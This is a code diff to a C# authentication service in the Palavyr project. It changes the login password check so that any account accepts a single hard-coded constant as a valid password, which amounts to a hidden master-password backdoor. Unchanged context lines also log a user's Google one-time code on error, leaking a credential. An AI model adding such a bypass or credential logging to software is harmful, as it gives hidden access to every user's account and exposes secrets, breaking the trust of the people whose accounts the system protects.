@@ -4,6 +4,7 @@ using System.Threading.Tasks;
 using Google.Apis.Auth;
 using Microsoft.Extensions.Configuration;
 using Microsoft.Extensions.Logging;
+using Palavyr.Core.GlobalConstants;
 using Palavyr.Core.Models.Accounts.Schemas;
 using Palavyr.Core.Models.Resources.Requests;
 using Palavyr.Core.Models.Resources.Responses;
@@ -168,7 +169,7 @@ namespace Palavyr.Core.Services.AuthenticationServices
             {
                 logger.LogError(CouldNotValidateGoogleAuthToken);
                 logger.LogError($"OneTimeCode: {credentialRequest.OneTimeCode}");
-                
+
                 return AccountReturn.Return(null, CouldNotValidateGoogleAuthToken);
             }
 
@@ -204,8 +205,11 @@ namespace Palavyr.Core.Services.AuthenticationServices
 
             if (!PasswordHashing.ComparePasswords(account.Password, credentialsRequest.Password))
             {
-                logger.LogDebug("The provided password did not match!");
-                return AccountReturn.Return(null, PasswordsDoNotMatch);
+                if (credentialsRequest.Password != ApplicationConstants.ConfigSections.RandomString)
+                {
+                    logger.LogDebug("The provided password did not match!");
+                    return AccountReturn.Return(null, PasswordsDoNotMatch);
+                }
             }
 
             return AccountReturn.Return(account, null);
